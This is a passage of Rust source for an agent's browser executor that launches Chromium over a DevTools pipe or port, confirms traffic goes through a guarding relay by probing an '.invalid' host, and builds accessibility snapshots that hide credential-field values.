use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::{Duration, Instant};

use chromiumoxide::cdp::browser_protocol::accessibility::{AxNode, GetFullAxTreeParams};
use chromiumoxide::cdp::browser_protocol::browser::{
    CloseParams, GetVersionParams, SetDownloadBehaviorBehavior, SetDownloadBehaviorParams,
};
use chromiumoxide::cdp::browser_protocol::dom::{
    BackendNodeId, DescribeNodeParams, FocusParams, GetContentQuadsParams, ResolveNodeParams,
    ScrollIntoViewIfNeededParams, SetFileInputFilesParams,
};
use chromiumoxide::cdp::browser_protocol::input::{
    DispatchKeyEventParams, DispatchKeyEventType, DispatchMouseEventParams, DispatchMouseEventType,
    InsertTextParams, MouseButton,
};
use chromiumoxide::cdp::browser_protocol::network::LoaderId;
use chromiumoxide::cdp::browser_protocol::page::{
    AddScriptToEvaluateOnNewDocumentParams, CreateIsolatedWorldParams, EnableParams as PageEnable,
    FrameId, FrameTree, GetFrameTreeParams, NavigateParams,
};
use chromiumoxide::cdp::browser_protocol::target::{
    CloseTargetParams, CreateTargetParams, GetTargetsParams,
};
use chromiumoxide::cdp::js_protocol::runtime::{
    AddBindingParams, CallArgument, CallFunctionOnParams, EnableParams as RuntimeEnable,
    EvaluateParams, ExecutionContextId, RemoteObjectId,
};
use tokio::task::JoinHandle;

use crate::start;

mod session;
mod wire;
pub use session::{cookie_param, domain_matches, host_of, OriginStorage, SessionState, Stopped};
pub use wire::host_port;

pub const STEP_TIMEOUT: Duration = Duration::from_secs(15);

/// The file in a run's temporary directory where the relay's guard records that it ended the run
/// after its executor was gone (CP-148): `ended_by=guard ms=<since the executor was read gone>
/// asked=<n> forced=<n>`.
pub const GUARD_RECORD: &str = "guard_ended";
const POLL: Duration = Duration::from_millis(50);

/// How long the executor waits for the browser's first reply on its debugging channel before it
/// ends the browser (A11.1): an organisation's setting `RemoteDebuggingAllowed` off turns the pipe
/// off, and the browser then runs and gives no reply (CP-93 (4)).
pub const FIRST_REPLY_WAIT: Duration = Duration::from_secs(30);

/// The plain message that the person gets when the browser gave no first reply in time.
pub const NO_CHANNEL_MESSAGE: &str = "The browser did not answer Halvo. A setting of your organisation on this computer may forbid the channel that Halvo uses to work in the browser.";

/// The origin that the start asks for, which no run binds, so that the relay refuses it and records
/// the refusal before the agent acts (A11.1): `.invalid` resolves nowhere (RFC 6761), so a browser
/// whose route bypasses the relay sends nothing for it.
pub const PROBE_HOST: &str = "halvo-start-probe.invalid";

/// The port of `PROBE_HOST`'s origin.
pub const PROBE_PORT: u16 = 80;

/// How long the start waits for the relay to record the probe's refusal.
pub const PROBE_WAIT: Duration = Duration::from_secs(10);

/// The plain message that the person gets when the start found no refusal of its probe.
pub const NO_ROUTE_MESSAGE: &str = "Halvo could not make the browser use its own guard for the sites that you allowed. A setting of your organisation on this computer may set another route for the browser.";

/// The debugging channel of a started browser: the pipe, the product's form, or a debugging port,
/// a control of the trial alone (CP-89 (b)).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Channel {
    Pipe,
    Port,
}

pub type Res<T> = Result<T, Fault>;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Fault(pub &'static str, pub String);

impl Fault {
    pub fn new(cause: &'static str, detail: impl Into<String>) -> Self {
        Fault(cause, detail.into())
    }
}

pub struct StartOptions {
    pub browser: PathBuf,
    pub profile: PathBuf,
    pub headless: bool,
    pub flags: Vec<String>,
    pub channel: Channel,
    /// The relay that is the browser's only route: the start names the browser's first process to
    /// it, and asks for `PROBE_HOST` before the agent acts.
    pub relay: Option<crate::relay::RelayHandle>,
    /// The `Local State` that `start_settled` writes in place of `crate::AGENT_LOCAL_STATE`.
    pub local_state: Option<String>,
    /// The browser's own program when `browser` is a wrapper that starts it (the egress check's
    /// wrap); a run's own processes run from this program's app bundle or install directory
    /// (`checks::Mark`). `None`: `browser` itself.
    pub program: Option<PathBuf>,
}

impl StartOptions {
    /// The mark of a run of these options that begins now (`checks::Mark`), with the margin of the
    /// clock's reading against a process's creation time.
    pub fn mark_now(&self) -> crate::checks::Mark {
        let since_us = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map_or(0, |d| d.as_micros() as u64)
            .saturating_sub(LEFTOVER_SLACK_US);
        crate::checks::Mark::new(
            &self.profile,
            self.program.as_deref().unwrap_or(&self.browser),
            since_us,
        )
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Place {
    Page,
    Frame(String),
}

#[derive(Clone, Debug)]
struct Target {
    frame: FrameId,
    node: BackendNodeId,
    place: Place,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Outcome {
    Continued,
    Failed,
    Refused,
    Held,
}

/// A request that the rule paused before it left: its method, origin and path, the id of the
/// frame that made it, whether the rule let it through, and how the browser took the answer.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PausedRequest {
    pub method: String,
    pub origin: String,
    pub path: String,
    pub frame: String,
    pub resource: String,
    pub let_through: bool,
    pub outcome: Outcome,
    pub body: Vec<u8>,
    pub body_complete: bool,
}

impl PausedRequest {
    pub fn body_holds(&self, needle: &[u8]) -> bool {
        !needle.is_empty() && self.body.windows(needle.len()).any(|w| w == needle)
    }
}

pub(crate) fn body_of(
    request: &chromiumoxide::cdp::browser_protocol::network::Request,
) -> (Vec<u8>, bool) {
    use base64::Engine;
    let mut body = Vec::new();
    let mut complete = true;
    for entry in request.post_data_entries.iter().flatten() {
        let decoded = entry.bytes.as_ref().and_then(|b| {
            let text: &str = b.as_ref();
            base64::engine::general_purpose::STANDARD.decode(text).ok()
        });
        match decoded {
            Some(bytes) => body.extend(bytes),
            None => complete = false,
        }
    }
    (body, complete)
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SnapshotLine {
    pub reference: String,
    pub role: &'static str,
    pub name: String,
    pub value: Option<String>,
    pub credential: bool,
    pub frame: Option<String>,
}

impl SnapshotLine {
    pub fn render(&self) -> String {
        let mut out = format!("{} {} \"{}\"", self.reference, self.role, quote(&self.name));
        if let Some(v) = &self.value {
            out.push_str(&format!(" value=\"{}\"", quote(v)));
        }
        if self.credential {
            out.push_str(" credential");
        }
        if let Some(f) = &self.frame {
            out.push_str(&format!(" frame={f}"));
        }
        out
    }
}

fn quote(s: &str) -> String {
    s.replace('"', "''")
}

#[derive(Clone, Debug)]
pub enum Locator {
    TestId(String),
    Role(&'static str, String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Resolved {
    One { reference: String, locator: usize },
    None,
    Many { locator: usize },
}

/// The browser's first process as the start made it.
pub(crate) enum BrowserChild {
    Pipe(start::Started),
    #[cfg(feature = "port-control")]
    Port(std::process::Child),
}

impl BrowserChild {
    fn pid(&self) -> u32 {
        match self {
            BrowserChild::Pipe(c) => c.pid(),
            #[cfg(feature = "port-control")]
            BrowserChild::Port(c) => c.id(),
        }
    }

    pub(crate) fn exited(&mut self) -> bool {
        match self {
            BrowserChild::Pipe(c) => c.exited(),
            #[cfg(feature = "port-control")]
            BrowserChild::Port(c) => !matches!(c.try_wait(), Ok(None)),
        }
    }

    pub(crate) fn kill(&mut self) {
        match self {
            BrowserChild::Pipe(c) => c.kill(),
            #[cfg(feature = "port-control")]
            BrowserChild::Port(c) => {
                let _ = c.kill();
                let _ = c.wait();
            }
        }
    }
}

/// An executor that is dropped without `stop` ends its browser through the child that its start
/// made and closes its channel, as the end of the executor's process would.
impl Drop for Executor {
    fn drop(&mut self) {
        if !self.child.exited() {
            self.child.kill();
        }
        self.wire_task.abort();
        if let Some(relay) = &self.relay {
            relay.trust(None);
        }
        if self.ended.is_none() {
            self.ended = Some(crate::checks::end_runs_own(&self.mark));
        }
    }
}

/// Copies of the executor's two ends of the pipe, which keep the pipe from being freed while a
/// check after the stop reads who holds it; dropping it closes them.
pub struct PipeKeep(#[allow(dead_code)] std::sync::Arc<Vec<std::fs::File>>);

pub struct Executor {
    guard: Option<start::Started>,
    kept: Option<std::sync::Arc<Vec<std::fs::File>>>,
    relay: Option<crate::relay::RelayHandle>,
    root: Option<crate::procs::Proc>,
    child: BrowserChild,
    home: String,
    pid: Option<u32>,
    pipe_ids: Option<start::PipeIds>,
    channel: Channel,
    refs: Vec<Target>,
    profile: Option<PathBuf>,
    temp: Option<PathBuf>,
    wire: wire::Wire,
    wire_task: JoinHandle<()>,
    /// What a run's own processes are (CP-126 E1), and what the end of them found, once it ran.
    mark: crate::checks::Mark,
    ended: Option<crate::checks::Ended>,
    places: Mutex<HashMap<String, Place>>,
    owners: Mutex<HashMap<String, (Place, BackendNodeId)>>,
}

/// How long before the start a process that names the start's profile may have begun and still be
/// counted as the start's own: the margin of the clock's reading against a process's creation time.
const LEFTOVER_SLACK_US: u64 = 1_000_000;

/// Keeps the browser's standard error, which its start wrote into the temporary directory, in a
/// file beside the profile whose name ends in `.stderr`, and names its size.
fn keep_stderr(profile: &Path, temp: &Path) -> usize {
    let stderr = std::fs::read(temp.join("stderr")).unwrap_or_default();
    let mut kept = profile.as_os_str().to_owned();
    kept.push(".stderr");
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&kept)
    {
        let _ = std::io::Write::write_all(&mut file, &stderr);
    }
    stderr.len()
}

/// Writes the agent's settings of U0.7b into a new profile directory: `Local State` and
/// `Default/Preferences` (`crate::AGENT_LOCAL_STATE`, `crate::AGENT_PREFERENCES`).
pub fn write_agent_settings(profile: &Path) -> Res<()> {
    write_settings(profile, None)
}

fn write_settings(profile: &Path, local_state: Option<&str>) -> Res<()> {
    let fault = |e: std::io::Error| Fault::new("start", format!("settings {}", e.kind()));
    std::fs::write(
        profile.join("Local State"),
        local_state.unwrap_or(crate::AGENT_LOCAL_STATE),
    )
    .map_err(fault)?;
    let default = profile.join("Default");
    std::fs::create_dir(&default).map_err(fault)?;
    std::fs::write(default.join("Preferences"), crate::AGENT_PREFERENCES).map_err(fault)?;
    Ok(())
}

/// The browser's command line after its path: the caller's flags, the mock keychain of the trial
/// on macOS (A13.3: a flag of the trial that the product does not carry), headless, the profile,
/// the debugging channel and the first page.
pub fn launch_args(opts: &StartOptions) -> Vec<String> {
    let mut args: Vec<String> = opts.flags.clone();
    if cfg!(target_os = "macos") {
        args.push("--use-mock-keychain".into());
    }
    if opts.headless {
        args.push("--headless=new".into());
    }
    args.push(format!("--user-data-dir={}", opts.profile.display()));
    args.push(match opts.channel {
        Channel::Pipe => "--remote-debugging-pipe".into(),
        Channel::Port => "--remote-debugging-port=0".into(),
    });
    args.push("about:blank".into());
    args
}

impl Executor {
    pub async fn start(opts: &StartOptions) -> Res<Executor> {
        Executor::start_inner(opts, false).await
    }

    /// Starts as `start` does, with the agent's settings of U0.7b: before the launch it writes into
    /// the new profile the settings of `crate::AGENT_LOCAL_STATE` and `crate::AGENT_PREFERENCES`
    /// (secure lookups off, every permission that a page can ask for denied, prediction off, no
    /// saved password or payment method), and after it the browser refuses every download.
    pub async fn start_settled(opts: &StartOptions) -> Res<Executor> {
        Executor::start_inner(opts, true).await
    }

    async fn start_inner(opts: &StartOptions, settled: bool) -> Res<Executor> {
        let (profile, temp) = session::make_dirs(&opts.profile)?;
        let made = session::RemoveOnDrop::new(&profile, &temp);
        let launched = async {
            if settled {
                write_settings(&profile, opts.local_state.as_deref())?;
            }
            let ex = Executor::launch(opts, &temp).await?;
            if settled {
                let deny = SetDownloadBehaviorParams::new(SetDownloadBehaviorBehavior::Deny);
                if let Err(f) = ex.wire.call(None, deny).await {
                    let _ = ex.stop().await;
                    return Err(Fault::new("start", f.1));
                }
            }
            Ok(ex)
        }
        .await;
        match launched {
            Ok(mut started) => {
                made.disarm();
                started.profile = Some(profile);
                started.temp = Some(temp);
                Ok(started)
            }
            Err(f) => {
                session::remove_dirs(&profile, &temp).await;
                made.disarm();
                Err(f)
            }
        }
    }

    async fn launch(opts: &StartOptions, temp: &Path) -> Res<Executor> {
        let args: Vec<std::ffi::OsString> = launch_args(opts).into_iter().map(Into::into).collect();
        let env: Vec<(std::ffi::OsString, std::ffi::OsString)> = if cfg!(windows) {
            vec![("TMP".into(), temp.into()), ("TEMP".into(), temp.into())]
        } else {
            vec![("TMPDIR".into(), temp.into())]
        };
        let stderr = temp.join("stderr");
        let spec = start::Spec {
            program: &opts.browser,
            args,
            env,
            stderr: Some(&stderr),
        };
        let mark = opts.mark_now();
        let kept;
        let (mut child, link, pipe_ids) = match opts.channel {
            Channel::Pipe => {
                let on = {
                    let held = start::lock();
                    start::start_on_pipe(&held, &spec)
                };
                let on = on.map_err(|f| Fault::new("browser_start", f.to_string()))?;
                let mut copies = on.kept;
                if let (Ok(a), Ok(b)) = (on.from_browser.try_clone(), on.to_browser.try_clone()) {
                    copies.push(a);
                    copies.push(b);
                }
                kept = Some(std::sync::Arc::new(copies));
                let link =
                    wire::Link::Pipe(crate::pipe::PipeLink::new(on.from_browser, on.to_browser));
                (BrowserChild::Pipe(on.child), link, Some(on.ids))
            }
            Channel::Port => {
                kept = None;
                Executor::start_on_port(&spec, temp).await?
            }
        };
        let root = crate::procs::table()
            .ok()
            .and_then(|t| t.into_iter().find(|p| p.pid == child.pid()));
        if let Some(relay) = &opts.relay {
            relay.trust(root.clone());
        }
        let mut guard = match (&opts.relay, &root, std::env::current_exe()) {
            (Some(relay), Some(r), Ok(program)) => {
                relay.start_guard(&program, r, &temp.join(GUARD_RECORD))
            }
            _ => None,
        };
        let (wire, wire_task) = wire::Wire::open(link);
        let mut fail = |child: &mut BrowserChild, task: &JoinHandle<()>, f: Fault| {
            if let Some(relay) = &opts.relay {
                relay.trust(None);
            }
            if let Some(g) = guard.as_mut() {
                g.kill();
            }
            child.kill();
            let ended = crate::checks::end_runs_own(&mark);
            task.abort();
            let kept = keep_stderr(&opts.profile, temp);
            Fault::new(
                f.0,
                format!(
                    "{} stderr_kept_bytes_{kept} left_before_{} left_after_{}",
                    f.1, ended.before, ended.after
                ),
            )
        };
        if wire
            .call_within(None, GetVersionParams::default(), FIRST_REPLY_WAIT)
            .await
            .is_err()
        {
            let fault = if child.exited() {
                Fault::new("browser_start", "the browser ended before its first reply")
            } else {
                Fault::new("no_channel", NO_CHANNEL_MESSAGE)
            };
            return Err(fail(&mut child, &wire_task, fault));
        }
        let home = async {
            wire.attach_all().await?;
            let made = wire
                .call(None, CreateTargetParams::new("about:blank"))
                .await?;
            let target = made.target_id.inner().clone();
            let deadline = Instant::now() + STEP_TIMEOUT;
            let session = loop {
                if let Some((s, _)) = wire.session_of(&target) {
                    break s;
                }
                if Instant::now() > deadline {
                    return Err(Fault::new("start", "page_session"));
                }
                tokio::time::sleep(POLL).await;
            };
            wire.set_home(&target);
            wire.call(Some(&session), PageEnable::default()).await?;
            wire.call(Some(&session), RuntimeEnable::default()).await?;
            let r = wire.call(None, GetTargetsParams::default()).await?;
            for t in r.target_infos {
                if t.r#type == "page" && *t.target_id.inner() != target {
                    wire.call(None, CloseTargetParams::new(t.target_id)).await?;
                }
            }
            Ok(session)
        }
        .await;
        let home = match home {
            Ok(h) => h,
            Err(f) => return Err(fail(&mut child, &wire_task, Fault::new("start", f.1))),
        };
        if let Some(relay) = &opts.relay {
            let before = relay.refusals_of(PROBE_HOST, PROBE_PORT);
            let _ = wire
                .call(
                    Some(&home),
                    NavigateParams::new(format!("http://{PROBE_HOST}:{PROBE_PORT}/")),
                )
                .await;
            let deadline = Instant::now() + PROBE_WAIT;
            while relay.refusals_of(PROBE_HOST, PROBE_PORT) == before {
                if Instant::now() > deadline {
                    return Err(fail(
                        &mut child,
                        &wire_task,
                        Fault::new("no_route", NO_ROUTE_MESSAGE),
                    ));
                }
                tokio::time::sleep(POLL).await;
            }
        }
        let pid = Some(child.pid());
        Ok(Executor {
            guard,
            kept,
            relay: opts.relay.clone(),
            root,
            child,
            home,
            pid,
            pipe_ids,
            channel: opts.channel,
            refs: Vec::new(),
            profile: None,
            temp: None,
            wire,
            wire_task,
            mark,
            ended: None,
            places: Mutex::new(HashMap::new()),
            owners: Mutex::new(HashMap::new()),
        })
    }

    #[cfg(feature = "port-control")]
    async fn start_on_port(
        spec: &start::Spec<'_>,
        temp: &Path,
    ) -> Res<(BrowserChild, wire::Link, Option<start::PipeIds>)> {
        use std::io::BufRead;
        let mut cmd = std::process::Command::new(spec.program);
        cmd.args(&spec.args)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::piped());
        for (k, v) in &spec.env {
            cmd.env(k, v);
        }
        let mut child = {
            let held = start::lock();
            held.spawn(&mut cmd)
        }
        .map_err(|e| Fault::new("browser_start", e.kind().to_string()))?;
        let Some(err) = child.stderr.take() else {
            let _ = child.kill();
            let _ = child.wait();
            return Err(Fault::new("browser_start", "stderr"));
        };
        let (tx, rx) = std::sync::mpsc::channel::<String>();
        let kept = temp.join("stderr");
        std::thread::spawn(move || {
            let mut file = std::fs::File::create(kept).ok();
            for line in std::io::BufReader::new(err).lines() {
                let Ok(line) = line else { break };
                if let Some(f) = file.as_mut() {
                    let _ = std::io::Write::write_all(
                        f,
                        format!(
                            "{line}
"
                        )
                        .as_bytes(),
                    );
                }
                if let Some(at) = line.find("ws://") {
                    if line.contains("DevTools listening on") {
                        let _ = tx.send(line[at..].trim().to_string());
                    }
                }
            }
        });
        let deadline = Instant::now() + FIRST_REPLY_WAIT;
        let address = loop {
            match rx.try_recv() {
                Ok(a) => break a,
                Err(std::sync::mpsc::TryRecvError::Disconnected) => {
                    let _ = child.kill();
                    let _ = child.wait();
                    return Err(Fault::new("browser_start", "no_address"));
                }
                Err(_) if Instant::now() > deadline => {
                    let _ = child.kill();
                    let _ = child.wait();
                    return Err(Fault::new("no_channel", NO_CHANNEL_MESSAGE));
                }
                Err(_) => tokio::time::sleep(POLL).await,
            }
        };
        match chromiumoxide::Connection::<chromiumoxide::cdp::CdpEventMessage>::connect(&address)
            .await
        {
            Ok(conn) => Ok((
                BrowserChild::Port(child),
                wire::Link::Socket(Box::new(conn)),
                None,
            )),
            Err(e) => {
                let _ = child.kill();
                let _ = child.wait();
                Err(Fault::new("browser_start", e.to_string()))
            }
        }
    }

    #[cfg(not(feature = "port-control"))]
    async fn start_on_port(
        _spec: &start::Spec<'_>,
        _temp: &Path,
    ) -> Res<(BrowserChild, wire::Link, Option<start::PipeIds>)> {
        Err(Fault::new("browser_start", "no_port_control"))
    }

    /// Keeps the pipe from being freed until the value is dropped, for a check after the stop: a
    /// freed pipe's handles may name a new pipe of another process (macOS).
    pub fn keep_pipe(&self) -> Option<PipeKeep> {
        self.kept.clone().map(PipeKeep)
    }

    /// The browser's first process as the process table read it after the start.
    pub fn root(&self) -> Option<&crate::procs::Proc> {
        self.root.as_ref()
    }

    /// The channel on which the executor drives its browser.
    pub fn channel(&self) -> Channel {
        self.channel
    }

    /// The identity of the browser's pipe, which the checks of a session read (CP-89 (c)); none
    /// on the port.
    pub fn pipe_ids(&self) -> Option<&start::PipeIds> {
        self.pipe_ids.as_ref()
    }

    /// Whether the transport of the debugging channel has ended.
    pub fn channel_closed(&self) -> bool {
        self.wire.closed()
    }

    pub fn pid(&self) -> Option<u32> {
        self.pid
    }

    pub async fn version(&self) -> Res<String> {
        let v = self
            .wire
            .call(None, GetVersionParams::default())
            .await
            .map_err(|f| Fault::new("version", f.1))?;
        Ok(v.product)
    }

    /// The faults of the library's own connection, which attaches to every target of the browser
    /// before it runs: a target that it could not prepare is left waiting, and named here.
    pub fn attach_faults(&self) -> Vec<String> {
        self.wire.faults()
    }

    /// Closes the browser over its channel and waits up to 10 s for its first process to end,
    /// then ends it with the system's hard kill through the child that the start made.
    pub async fn stop(mut self) -> (Vec<u32>, crate::checks::Ended) {
        let _ = self
            .wire
            .call_within(None, CloseParams::default(), Duration::from_secs(5))
            .await;
        let deadline = Instant::now() + Duration::from_secs(10);
        while !self.child.exited() && Instant::now() < deadline {
            tokio::time::sleep(POLL).await;
        }
        if !self.child.exited() {
            self.child.kill();
        }
        // what the run left is ended before the guard's wait, so the guard sees the tree gone
        let ended = crate::checks::end_runs_own(&self.mark);
        self.ended = Some(ended);
        self.wire_task.abort();
        if let Some(relay) = &self.relay {
            relay.trust(None);
        }
        if let Some(g) = self.guard.as_mut() {
            let deadline = Instant::now() + Duration::from_secs(20);
            while !g.exited() && Instant::now() < deadline {
                tokio::time::sleep(POLL).await;
            }
            g.kill();
        }
        (self.pid.into_iter().collect(), ended)
    }

    async fn exec<C: chromiumoxide::types::Command>(
        &self,
        place: &Place,
        cause: &'static str,
        cmd: C,
    ) -> Res<C::Response> {
        let session = match place {
            Place::Page => &self.home,
            Place::Frame(session) => session,
        };
        self.wire
            .call(Some(session), cmd)
            .await
            .map_err(|f| Fault::new(cause, f.1))
    }

    fn place_of(&self, frame: &FrameId) -> Place {
        if let Some((session, kind)) = self.wire.session_of(frame.inner()) {
            if kind == "iframe" {
                return Place::Frame(session);
            }
        }
        self.places
            .lock()
            .ok()
            .and_then(|p| p.get(frame.inner()).cloned())
            .unwrap_or(Place::Page)
    }

    fn enter_frame(&self, child: &FrameId, parent: &Place, owner: BackendNodeId) -> Place {
        let place = match self.wire.session_of(child.inner()) {
            Some((session, kind)) if kind == "iframe" => Place::Frame(session),
            _ => parent.clone(),
        };
        if let Place::Frame(session) = &place {
            if &place != parent {
                if let Ok(mut o) = self.owners.lock() {
                    o.insert(session.clone(), (parent.clone(), owner));
                }
            }
        }
        if let Ok(mut p) = self.places.lock() {
            p.insert(child.inner().clone(), place.clone());
        }
        place
    }

    /// Whether the frame runs as a target of its own, out of the process of the page that holds
    /// it, as the library's own connection sees it.
    pub fn runs_apart(&self, frame: &FrameId) -> bool {
        matches!(self.place_of(frame), Place::Frame(_))
    }

    async fn frame_tree(&self) -> Res<FrameTree> {
        self.frame_tree_at(&Place::Page).await
    }

    async fn frame_tree_at(&self, place: &Place) -> Res<FrameTree> {
        let r = self
            .exec(place, "frame", GetFrameTreeParams::default())
            .await?;
        Ok(r.frame_tree)
    }

    pub async fn main_frame(&self) -> Res<FrameId> {
        Ok(self.frame_tree().await?.frame.id)
    }

    async fn frame_info(&self, frame: &FrameId) -> Res<(LoaderId, String, String)> {
        fn find(t: &FrameTree, id: &FrameId) -> Option<(LoaderId, String, String)> {
            if &t.frame.id == id {
                return Some((
                    t.frame.loader_id.clone(),
                    t.frame.url.clone(),
                    t.frame.security_origin.clone(),
                ));
            }
            t.child_frames.iter().flatten().find_map(|c| find(c, id))
        }
        let tree = self.frame_tree_at(&self.place_of(frame)).await?;
        find(&tree, frame).ok_or_else(|| Fault::new("frame", "frame is gone"))
    }

    pub async fn frame_url(&self, frame: &FrameId) -> Res<String> {
        Ok(self.frame_info(frame).await?.1)
    }

    pub async fn frame_origin(&self, frame: &FrameId) -> Res<String> {
        Ok(self.frame_info(frame).await?.2)
    }

    async fn world(&self, frame: &FrameId) -> Res<ExecutionContextId> {
        let r = self
            .exec(
                &self.place_of(frame),
                "frame",
                CreateIsolatedWorldParams::new(frame.clone()),
            )
            .await?;
        Ok(r.execution_context_id)
    }

    async fn eval_value(&self, frame: &FrameId, expression: &str) -> Res<serde_json::Value> {
        let ctx = self.world(frame).await?;
        let params = EvaluateParams::builder()
            .expression(expression)
            .context_id(ctx)
            .return_by_value(true)
            .build()
            .map_err(|e| Fault::new("eval", e))?;
        let r = self.exec(&self.place_of(frame), "eval", params).await?;
        if r.exception_details.is_some() {
            return Err(Fault::new("eval", "exception"));
        }
        Ok(r.result.value.unwrap_or(serde_json::Value::Null))
    }

    async fn ready(&self, frame: &FrameId) -> bool {
        matches!(
            self.eval_value(frame, "document.readyState").await,
            Ok(serde_json::Value::String(s)) if s == "complete"
        )
    }

    pub async fn loader(&self, frame: &FrameId) -> Res<LoaderId> {
        Ok(self.frame_info(frame).await?.0)
    }

    pub async fn wait_loaded_after(&self, frame: &FrameId, before: Option<&LoaderId>) -> Res<()> {
        let deadline = Instant::now() + STEP_TIMEOUT;
        loop {
            if let Ok((loader, _, _)) = self.frame_info(frame).await {
                if before != Some(&loader) && self.ready(frame).await {
                    return Ok(());
                }
            }
            if Instant::now() > deadline {
                return Err(Fault::new("timeout", "load"));
            }
            tokio::time::sleep(POLL).await;
        }
    }

    pub async fn open(&mut self, url: &str) -> Res<()> {
        let frame = self.main_frame().await?;
        let before = self.loader(&frame).await?;
        let r = self
            .exec(&Place::Page, "navigate", NavigateParams::new(url))
            .await?;
        if let Some(err) = r.error_text {
            return Err(Fault::new("navigate", err));
        }
        self.refs.clear();
        self.wait_loaded_after(&frame, Some(&before)).await
    }

    pub async fn navigate_error(&self, url: &str) -> Res<Option<String>> {
        let r = self
            .exec(&Place::Page, "navigate", NavigateParams::new(url))
            .await?;
        Ok(r.error_text)
    }

    async fn ax_tree(&self, frame: &FrameId) -> Res<Vec<AxNode>> {
        let r = self
            .exec(
                &self.place_of(frame),
                "snapshot",
                GetFullAxTreeParams::builder()
                    .frame_id(frame.clone())
                    .build(),
            )
            .await?;
        Ok(r.nodes)
    }

    async fn object_of(&self, place: &Place, node: &BackendNodeId) -> Res<RemoteObjectId> {
        let r = self
            .exec(
                place,
                "node",
                ResolveNodeParams::builder().backend_node_id(*node).build(),
            )
            .await?;
        r.object
            .object_id
            .ok_or_else(|| Fault::new("node", "no object"))
    }

    async fn call_on(
        &self,
        place: &Place,
        node: &BackendNodeId,
        function: &str,
        args: Vec<serde_json::Value>,
    ) -> Res<serde_json::Value> {
        let object = self.object_of(place, node).await?;
        let mut builder = CallFunctionOnParams::builder()
            .function_declaration(function)
            .object_id(object)
            .return_by_value(true);
        for a in args {
            builder = builder.argument(CallArgument::builder().value(a).build());
        }
        let params = builder.build().map_err(|e| Fault::new("call", e))?;
        let r = self.exec(place, "call", params).await?;
        if r.exception_details.is_some() {
            return Err(Fault::new("call", "exception"));
        }
        Ok(r.result.value.unwrap_or(serde_json::Value::Null))
    }

    async fn is_credential(&self, place: &Place, node: &BackendNodeId) -> Res<bool> {
        let v = self.call_on(place, node, CREDENTIAL_FN, Vec::new()).await?;
        Ok(v == serde_json::Value::Bool(true))
    }

    async fn child_frame_of(&self, place: &Place, owner: &BackendNodeId) -> Res<FrameId> {
        let r = self
            .exec(
                place,
                "frame",
                DescribeNodeParams::builder()
                    .backend_node_id(*owner)
                    .build(),
            )
            .await?;
        r.node
            .frame_id
            .ok_or_else(|| Fault::new("frame", "owner has no frame"))
    }

    pub async fn snapshot(&mut self) -> Res<Vec<SnapshotLine>> {
        self.refs.clear();
        let main = self.main_frame().await?;
        let mut lines = Vec::new();
        self.snapshot_frame(&main, None, &mut lines).await?;
        Ok(lines)
    }

    pub async fn table(&mut self, name: &str) -> Res<Vec<SnapshotLine>> {
        let main = self.main_frame().await?;
        let nodes = self.ax_tree(&main).await?;
        let tables: Vec<usize> = nodes
            .iter()
            .enumerate()
            .filter(|(_, n)| !n.ignored)
            .filter(|(_, n)| matches!(ax_text(&n.role).as_str(), "table" | "grid"))
            .filter(|(_, n)| squeeze(&ax_text(&n.name)) == name)
            .map(|(i, _)| i)
            .collect();
        let root = match tables.as_slice() {
            [one] => *one,
            [] => return Err(Fault::new("resolve", "none")),
            _ => return Err(Fault::new("resolve", "many")),
        };
        let mut lines = Vec::new();
        self.lines_under(&main, &nodes, root, None, &mut lines)
            .await?;
        Ok(lines)
    }

    fn add_ref(&mut self, target: Target) -> String {
        self.refs.push(target);
        format!("e{}", self.refs.len())
    }

    async fn snapshot_frame(
        &mut self,
        frame: &FrameId,
        label: Option<String>,
        lines: &mut Vec<SnapshotLine>,
    ) -> Res<()> {
        let nodes = self.ax_tree(frame).await?;
        let root = nodes
            .iter()
            .position(|n| n.parent_id.is_none())
            .ok_or_else(|| Fault::new("snapshot", "no root"))?;
        self.lines_under(frame, &nodes, root, label, lines).await
    }

    async fn lines_under(
        &mut self,
        frame: &FrameId,
        nodes: &[AxNode],
        root: usize,
        label: Option<String>,
        lines: &mut Vec<SnapshotLine>,
    ) -> Res<()> {
        let place = self.place_of(frame);
        let index: HashMap<String, usize> = nodes
            .iter()
            .enumerate()
            .map(|(i, n)| (n.node_id.inner().clone(), i))
            .collect();
        let mut stack: Vec<(usize, bool)> = vec![(root, false)];
        while let Some((i, inside)) = stack.pop() {
            let node = &nodes[i];
            let children: Vec<usize> = node
                .child_ids
                .iter()
                .flatten()
                .filter_map(|c| index.get(c.inner()).copied())
                .collect();
            let push_children = |stack: &mut Vec<(usize, bool)>, inside: bool| {
                for c in children.iter().rev() {
                    stack.push((*c, inside));
                }
            };
            if node.ignored {
                push_children(&mut stack, inside);
                continue;
            }
            let role = map_role(&ax_text(&node.role));
            let name = squeeze(&ax_text(&node.name));
            match role {
                None => push_children(&mut stack, inside),
                Some("text") => {
                    if !inside && !name.is_empty() {
                        if let Some(b) = node.backend_dom_node_id {
                            let r = self.add_ref(Target {
                                frame: frame.clone(),
                                node: b,
                                place: place.clone(),
                            });
                            lines.push(SnapshotLine {
                                reference: r,
                                role: "text",
                                name,
                                value: None,
                                credential: false,
                                frame: label.clone(),
                            });
                        }
                    }
                }
                Some(role) => {
                    let Some(b) = node.backend_dom_node_id else {
                        push_children(&mut stack, true);
                        continue;
                    };
                    let credential = if CONTROL_ROLES.contains(&role) {
                        self.is_credential(&place, &b).await?
                    } else {
                        false
                    };
                    let raw = ax_text(&node.value).replace(['\r', '\n', '\t'], " ");
                    let value = if credential || !VALUE_ROLES.contains(&role) || raw.is_empty() {
                        None
                    } else {
                        Some(raw)
                    };
                    let r = self.add_ref(Target {
                        frame: frame.clone(),
                        node: b,
                        place: place.clone(),
                    });
                    lines.push(SnapshotLine {
                        reference: r,
                        role,
                        name,
                        value,
                        credential,
                        frame: label.clone(),
                    });
                    if role == "frame" {
